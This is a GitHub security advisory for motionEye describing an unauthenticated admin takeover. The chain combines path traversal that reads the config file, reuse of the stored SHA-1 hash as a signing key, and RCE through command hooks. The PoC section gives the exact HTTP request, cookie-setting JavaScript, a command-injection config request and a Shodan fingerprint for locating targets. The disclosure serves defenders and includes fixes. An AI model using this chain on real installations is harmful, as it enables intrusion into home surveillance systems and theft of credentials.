# [C] motionEye Partial Authentication Bypass: Unauthenticated Admin Credential Theft via Path Traversal

## Summary
Severity: Critical
Advisory: GHSA-phv5-334h-mxcw
CWE: CWE-35
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-06-23
Source: https://github.com/advisories/GHSA-phv5-334h-mxcw
Type: github-advisory

## Affected
- PyPI: `motioneye` — affected >=0 <0.44.0

## Details
# Partial Authentication Bypass: Unauthenticated Admin Credential Theft via Path Traversal

### Summary

Myself and others have reported several RCE vulnerabilities to this project. However, due to the nature of the app, these are largely not of all that much value, as there is built-in functionality to run commands upon certain actions — i.e. RCE is by design.

With that in mind, I endeavored to find some sort of auth bypass, and was slightly successful.

When the admin password is set but the normal (surveillance) user password is left empty (the default), an unauthenticated attacker can exploit a path traversal vulnerability to read the motionEye configuration file from disk. This file contains the admin password as a SHA-1 hash, and that hash is accepted directly as a signing key for admin API requests — no cracking required. The result is full admin access from zero credentials.

This is a realistic scenario: many installations set an admin password to protect the settings UI but leave the normal user password empty so household members can view camera feeds without logging in.

### Details

The vulnerability chains two independent issues:

**1. Unauthenticated normal-user access when `@normal_password` is empty**

In `motioneye/handlers/base.py`, lines 149-151:

```python
# no authentication required for normal user
if not username and not normal_password:
    return 'normal'
```

When `@normal_password` is empty (the default — see `config.py` line 2251: `data.setdefault('@normal_password', '')`), any request without a `_username` parameter is silently granted `normal` user access. This is by design for convenience, but it means all normal-level endpoints are fully unauthenticated.

**2. Path traversal in `MoviePlaybackHandler` (and related handlers)**

The movie playback handler at `motioneye/handlers/movie_playback.py` serves recorded video files. It accepts a filename in the URL path:

```
GET /movie/<camera_id>/playback/<filename>
```

The filename is passed to `mediafiles.get_media_path()` (`mediafiles.py` lines 497-500):

```python
def get_media_path(camera_config, path, media_type):
    target_dir = camera_config.get('target_dir')
    full_path = os.path.join(target_dir, path)
    return full_path
```

When `path` is an absolute path (e.g. `/etc/motioneye/motion.conf`), Python's `os.path.join()` discards `target_dir` entirely and returns the absolute path as-is. This would normally be caught by Tornado's `StaticFileHandler` path validation, but `MoviePlaybackHandler` explicitly overrides both safety checks (`movie_playback.py` lines 111-115):

```python
def get_absolute_path(self, root, path):
    return path

def validate_absolute_path(self, root, absolute_path):
    return absolute_path
```

This allows reading any file on the filesystem that the motionEye process can access.

The same path traversal exists in the movie download, picture download, and picture preview handlers:

- `GET /movie/<camera_id>/download/<filename>`
- `GET /picture/<camera_id>/download/<filename>`
- `GET /picture/<camera_id>/preview/<filename>`

**3. Admin hash stored in a readable config file and accepted directly as a signing key**

motionEye stores the admin password as `SHA1(plaintext)` in its main configuration file (`motion.conf`), written as a comment line:

```
# @admin_password 7b7d55439abccf4ae83047c1af2707e6eb6664db
```

The authentication code in `base.py` (lines 137-147) accepts signatures computed with **either** the raw stored hash or `SHA1(stored_hash)` as the signing key:

```python
if username == admin_username and (
    signature == utils.compute_signature(
        self.request.method, self.request.uri, self.request.body, admin_password
    )
    or signature == utils.compute_signature(
        self.request.method, self.request.uri, self.request.body, admin_hash
    )
):
    return 'admin'
```

Here `admin_password` is the raw value from the config file (the SHA-1 hash), and `admin_hash` is `SHA1(admin_password)` — a hash of the hash. Since the stored value is already a SHA-1 hash, and it is accepted directly as a valid signing key, there is no need to crack it. The attacker can use the stolen hash immediately.

Furthermore, the client-side JavaScript (`static/js/main.js` line 3631) computes `sha1(plaintext_password)` and stores it in the `meye_password_hash` cookie as the signing key. This is the same value as `@admin_password` in the config file.

### PoC

**Step 1** — Read the config file (unauthenticated, requires empty normal password):

```
GET /movie/1/playback//etc/motioneye/motion.conf HTTP/1.1
Host: target:8765
```

Response contains:

```
# @admin_username admin
# @admin_password 7b7d55439abccf4ae83047c1af2707e6eb6664db
```

**Step 2** — Use the hash to become admin. In the browser console:

```javascript
document.cookie = "meye_username=admin; path=/";
document.cookie = "meye_password_hash=7b7d55439abccf4ae83047c1af2707e6eb6664db; path=/";
location.reload();
```

The page reloads with full admin access. All subsequent requests are signed with the stolen hash.

**Step 3 (optional)** — Achieve RCE via the admin config API. The admin can set `command_notifications_exec` or `command_storage_exec` to arbitrary shell commands, which are written into motion event hooks and executed by the motion daemon:

```
POST /config/1/set HTTP/1.1
Content-Type: application/json

{"command_notifications_enabled": true, "command_notifications_exec": "touch /tmp/pwned", ...}
```

### Impact

- **Privilege escalation from zero credentials to full admin** on any installation where the admin password is set but the normal user password is left empty (the default configuration).
- **Arbitrary file read** of any file readable by the motionEye process (typically running as `motion` user, or `root` on motionEyeOS). This includes `/etc/passwd`, `/etc/shadow` (if permissions allow), SSH keys, and application secrets.
- **Full remote code execution** — once admin access is obtained, the attacker can inject arbitrary shell commands via motion event hooks (`command_notifications_exec`, `command_storage_exec`, or `web_hook_storage_url`). Commands execute as the motion daemon user.
- **Realistic attack surface** — this is a common configuration for home surveillance setups where the admin password protects settings but camera feeds are left open for household members. Public instances are discoverable via Shodan (`http.favicon.hash:1898775751`).

### Suggested Fix

1. The path traversal should be fixed by validating that the resolved path stays within the camera's `target_dir`. Do not override `get_absolute_path` and `validate_absolute_path` to bypass Tornado's built-in protections. At minimum, reject absolute paths in the filename parameter.
2. Consider warning users in the UI when the normal user password is empty, as this makes all normal-level endpoints (including the vulnerable file handlers) fully unauthenticated.
3. The admin password hash should not be stored in a file that is served by the same file handlers used for media content. Alternatively, the `@` metadata lines should be moved to a separate configuration file that is not within any camera's media path.

## References
- https://github.com/motioneye-project/motioneye/security/advisories/GHSA-phv5-334h-mxcw
- https://github.com/motioneye-project/motioneye
